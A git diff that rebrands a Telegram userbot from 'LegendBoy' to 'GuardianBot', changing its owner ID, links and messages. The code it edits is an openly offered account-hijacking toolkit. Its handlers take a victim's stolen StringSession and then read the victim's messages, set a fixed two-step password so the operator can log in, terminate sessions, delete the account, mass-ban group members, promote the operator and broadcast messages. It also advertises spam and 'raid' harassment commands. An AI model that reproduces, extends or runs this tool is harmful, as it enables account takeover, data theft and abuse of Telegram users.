@@ -15,32 +15,32 @@ from .helpers.hack import *
 
 mybot = "missrose_bot"
 
-legendboy = 2024465080
+dinoguardian = 5480165828
 
 
 from telethon import Button, custom, events
 
 from .core.logger import logging
-from .core.session import legend, tgbot
+from .core.session import guardian, tgbot
 
-LOGS = logging.getLogger("LegendUserBot")
-LEGEND_PIC = "https://te.legra.ph/file/d3785d49b2c5e6f00bc67.jpg"
+LOGS = logging.getLogger("GuardianUserBot")
+GUARDIAN_PIC = "https://telegra.ph/file/992bb3e9e8863f6492b94.jpg"
 
 onbot = "start - Check if I am Alive \nhelp - Check ALL Command\nalive- To Check alive status\nping - To check ping of bot\nuinfo - To Check info of assistant chat\nbroadcast - broadcast message to all the person who has started ur bot\nban - to ban person to block message in assistant chat\nunban - To Unban Person allw to message in assistant chat\neval - To run python code\npurge - To Purge Message from replied\ndel - To del replied message\nbigspam - To Spam Through Bot value > 100\ndelayspam - Spam With Delay \nraid - To Abuse Anyone By username/name/reply\nreplyraid - To Activate Raid On Anyone\ndreplyraid - To Stop Raid\nspam - To Spam With Chat value < 100\nhack - Hack Telegram account through StringSession"
-perf = "[ †hê Lêɠêɳ̃dẞø† ]"
+perf = "[ 𝗧𝗛𝗘 𝗚𝗨𝗔𝗥𝗗𝗜𝗔𝗡𝗕𝗢𝗧 ]"
 
-bot = legend
+bot = guardian
 
 
 async def killer():
-    LEGEND_USER = bot.me.first_name
-    The_LegendBoy = bot.uid
-    legd_mention = f"[{LEGEND_USER}](tg://user?id={The_LegendBoy})"
+    GUARDIAN_USER = bot.me.first_name
+    DinoGuardian = bot.uid
+    legd_mention = f"[{GUARDIAN_USER}](tg://user?id={DINOGUARDIAN})"
     name = f"{legd_mention}'s Assistant"
     description = (
         f"I am Assistant Of {legd_mention}.This Bot Can Help U To Chat With My Master"
     )
-    starkbot = await legend.tgbot.get_me()
+    starkbot = await guardian.tgbot.get_me()
     bot_name = starkbot.first_name
     botname = f"@{starkbot.username}"
     if bot_name.endswith("Assistant"):
@@ -81,13 +81,13 @@ async def killer():
             print(e)
 
 
-@legend.tgbot.on(events.NewMessage(pattern="/start", func=lambda x: x.is_group))
+@guardian.tgbot.on(events.NewMessage(pattern="/start", func=lambda x: x.is_group))
 async def stat(event):
     keybard = [(Button.inline("⭐ Click Here ⭐", data="start"))]
     await tgbot.send_message(event.chat_id, f"Click Below To Start", buttons=keybard)
 
 
-@legend.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"start")))
+@guardian.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"start")))
 async def help(event):
     starkbot = await tgbot.get_me()
     bot_id = starkbot.first_name
@@ -95,11 +95,12 @@ async def help(event):
         await event.delete()
         await tgbot.send_message(
             event.chat_id,
-            message=f"Hey, I am your {bot_id}'s assistant bot.\nI Am Here To Help U \n\nPowered By [LegendBot](https://t.me/LegendBot_OP)",
+            message=f"Hey, I am your {bot_id}'s assistant bot.\nI Am Here To Help U \n\nPowered By [GuardianBot](https://t.me/GuardianBot_Support)",
             buttons=[
                 [
-                    Button.url(" Support ", "https://t.me/LegendBot_OP"),
-                    Button.url(" Updates ", "https://t.me/LegendBot_AI"),
+                    Button.url(" Community ", "https://t.me/GuardianCommunity"),
+                    Button.url(" Support ", "https://t.me/GuardianBot_Support"),
+                    Button.url(" Updates ", "https://t.me/GuardianBot_AI"),
                 ],
                 [
                     custom.Button.inline(" Users ", data="users"),
@@ -154,12 +155,12 @@ async def rel(event):
         )
 
 
-@legend.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"res_tart")))
+@guardian.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"res_tart")))
 async def res_ttart(event):
     if event.query.user_id == bot.uid:
         await event.answer("Restarting Please Wait 4 min... ", cache_time=0, alert=True)
         if BOTLOG:
-            LEGEND = await event.client.send_message(
+            GUARDIAN = await event.client.send_message(
                 BOTLOG_CHATID, "# RESTART \n" "Bot Restarted"
             )
         try:
@@ -193,7 +194,7 @@ async def help(event):
         await event.answer("Sorry This Button Only My Master", cache_time=0, alert=True)
 
 
-@legend.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"setvar")))
+@guardian.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"setvar")))
 async def users(event):
     async with tgbot.conversation(event.chat_id) as x:
         if (Config.API_KEY is None) or (Config.APP_NAME is None):
@@ -312,7 +313,7 @@ async def start(event):
         )
 
 
-@legend.tgbot.on(
+@guardian.tgbot.on(
     events.NewMessage(pattern="/hack", func=lambda x: x.sender_id == bot.uid)
 )
 async def start(event):
@@ -323,7 +324,7 @@ async def start(event):
         )
 
 
-@legend.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ahack")))
+@guardian.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ahack")))
 async def users(event):
     async with tgbot.conversation(event.chat_id) as x:
         await x.send_message("📍GIVE STRING SESSION")
@@ -343,13 +344,13 @@ async def users(event):
             )
         if len(i) > 3855:
             file = open("session.txt", "w")
-            file.write(i + "\n\nDetails BY LegendBoy")
+            file.write(i + "\n\nDetails BY DinoGuardian")
             file.close()
             await bot.send_file(event.chat_id, "session.txt")
             system("rm -rf session.txt")
         else:
             await event.reply(
-                i + "\n\nThanks For using LegendBoyBot. \n/hack", buttons=keyboard
+                i + "\n\nThanks For using GuardianBot. \n/hack", buttons=keyboard
             )
 
 
@@ -367,7 +368,7 @@ async def users(event):
             )
         i = await userinfo(strses.text)
         await event.reply(
-            i + "\n\nThanks For using LegendBoy Bot.\n/hack", buttons=keyboard
+            i + "\n\nThanks For using Guardiam Bot.\n/hack", buttons=keyboard
         )
 
 
@@ -387,7 +388,7 @@ async def users(event):
         grpid = await x.get_response()
         await userbans(strses.text, grpid.text)
         await event.reply(
-            "Banning all members. Thanks For using LegendBoy Bot", buttons=keyboard
+            "Banning all members. Thanks For using Guardian Bot", buttons=keyboard
         )
 
 
@@ -404,7 +405,7 @@ async def users(event):
                 "This StringSession Has Been Terminated.", buttons=keyboard
             )
         i = await usermsgs(strses.text)
-        await event.reply(i + "\n\nThanks For using LegendBoy Bot", buttons=keyboard)
+        await event.reply(i + "\n\nThanks For using Guardian Bot", buttons=keyboard)
 
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ehack")))
@@ -423,7 +424,7 @@ async def users(event):
         grpid = await x.get_response()
         await joingroup(strses.text, grpid.text)
         await event.reply(
-            "Joined the Channel/Group Thanks For using LegendBoy Bot", buttons=keyboard
+            "Joined the Channel/Group Thanks For using Guardian Bot", buttons=keyboard
         )
 
 
@@ -443,7 +444,7 @@ async def users(event):
         grpid = await x.get_response()
         await leavegroup(strses.text, grpid.text)
         await event.reply(
-            "Leaved the Channel/Group Thanks For using Boy Bot,", buttons=keyboard
+            "Leaved the Channel/Group Thanks For using Guardian Bot,", buttons=keyboard
         )
 
 
@@ -463,7 +464,7 @@ async def users(event):
         grpid = await x.get_response()
         await delgroup(strses.text, grpid.text)
         await event.reply(
-            "Deleted the Channel/Group Thanks For using LegendBoyBot.", buttons=keyboard
+            "Deleted the Channel/Group Thanks For using GuardianBot.", buttons=keyboard
         )
 
 
@@ -482,7 +483,7 @@ async def users(event):
         i = await user2fa(strses.text)
         if i:
             await event.reply(
-                "User don't have two step thats why now two step is `LegendBoy Bot Is best` you can login now\n\nThanks For using LegendBoy Bot.",
+                "User don't have two step thats why now two step is `Guardian Bot Is best` you can login now\n\nThanks For using GuardianBot.",
                 buttons=keyboard,
             )
         else:
@@ -503,7 +504,7 @@ async def users(event):
             )
         await terminate(strses.text)
         await event.reply(
-            "The all sessions are terminated\n\nThanks For using LegendBoyBot.",
+            "The all sessions are terminated\n\nThanks For using GuardianBot.",
             buttons=keyboard,
         )
 
@@ -522,7 +523,7 @@ async def users(event):
             )
         await delacc(strses.text)
         await event.reply(
-            "The Account is deleted SUCCESSFULLLY\n\nThanks For using LegendBoy Bot.",
+            "The Account is deleted SUCCESSFULLLY\n\nThanks For using Guardian Bot.",
             buttons=keyboard,
         )
 
@@ -545,7 +546,7 @@ async def users(event):
         user = await x.get_response()
         await promote(strses.text, grp.text, user.text)
         await event.reply(
-            "I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For Using LegendBoy Bot.",
+            "I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For Using Guardian Bot.",
             buttons=keyboard,
         )
 
@@ -569,7 +570,7 @@ async def users(event):
         except:
             pass
         await event.reply(
-            "I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using LegendBoyBot.",
+            "I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using GuardianBot.",
             buttons=keyboard,
         )
 
@@ -610,7 +611,7 @@ async def users(event):
                 await event.respond("Something is wrong")
         except Exception as e:
             await event.respond(
-                "SEND THIS ERROR TO - @Legend_Userbot\n**LOGS**\n" + str(e)
+                "SEND THIS ERROR TO - @Guardian_Userbot\n**LOGS**\n" + str(e)
             )
 
 
@@ -630,7 +631,7 @@ async def users(event):
         user = await x.get_response()
         await gpromote(strses.text, user.text)
         await event.reply(
-            "I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For Using LegendBoy Bot.",
+            "I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For Using GuardianBot.",
             buttons=keyboard,
         )
 
@@ -651,6 +652,6 @@ async def users(event):
         msg = await x.get_response()
         await gcast(strses.text, msg.text)
         await event.reply(
-            "Done 😗😗\n\nThanks For Using LegendBoy Bot.",
+            "Done 😗😗\n\nThanks For Using Guardian Bot.",
             buttons=keyboard,
         )
